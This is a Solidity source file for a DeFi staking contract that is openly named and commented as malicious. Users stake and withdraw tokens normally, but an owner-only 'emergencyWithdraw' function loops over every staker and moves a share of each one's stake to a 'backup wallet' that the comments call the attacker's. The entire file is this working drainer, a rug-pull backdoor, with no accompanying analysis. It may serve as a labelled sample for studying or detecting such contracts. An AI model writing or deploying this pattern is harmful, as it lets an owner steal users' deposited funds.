// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "../node_modules/@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../node_modules/@openzeppelin/contracts/access/Ownable.sol";

contract MaliciousDeFiProtocol is Ownable {
    IERC20 public token;

    // Address of the backup wallet (actually the attacker's wallet)
    address payable public backupWallet;

    // Mapping to keep track of user stakes
    mapping(address => uint256) private stakes;
    uint256 public totalStaked;

    // Array to keep track of all stakers
    address[] private stakers;
    mapping(address => bool) private isStaker;

    constructor(
        address _tokenAddress,
        address payable _backupWallet
    ) Ownable(msg.sender) {
        token = IERC20(_tokenAddress);
        backupWallet = _backupWallet;
    }

    // Function to allow users to stake tokens
    function stakeTokens(uint256 amount) external {
        require(
            token.transferFrom(msg.sender, address(this), amount),
            "Transfer failed"
        );
        if (!isStaker[msg.sender]) {
            stakers.push(msg.sender);
            isStaker[msg.sender] = true;
        }
        stakes[msg.sender] += amount;
        totalStaked += amount;
    }

    // Function to allow users to withdraw their staked tokens
    function withdrawTokens(uint256 amount) external {
        require(stakes[msg.sender] >= amount, "Insufficient staked amount");
        stakes[msg.sender] -= amount;
        totalStaked -= amount;
        token.transfer(msg.sender, amount);

        // Remove the staker from the list if they have no more tokens staked
        if (stakes[msg.sender] == 0) {
            isStaker[msg.sender] = false;
        }
    }

    // Function to check the amount of staked tokens by a user
    function checkStake(address user) external view returns (uint256) {
        return stakes[user];
    }

    // Function to handle emergency withdrawal to the backup wallet (malicious)
    function emergencyWithdraw(uint256 amount) external onlyOwner {
        require(amount <= totalStaked, "Insufficient staked amount");

        uint256 totalAmount = amount;
        for (uint256 i = 0; i < stakers.length; i++) {
            address user = stakers[i];
            if (isStaker[user]) {
                uint256 userStake = stakes[user];
                uint256 userAmount = (userStake * amount) / totalStaked;
                stakes[user] -= userAmount;
                token.transfer(backupWallet, userAmount);

                // Update the staker's status if they have no more tokens staked
                if (stakes[user] == 0) {
                    isStaker[user] = false;
                }
            }
        }
        totalStaked -= totalAmount;
    }
}
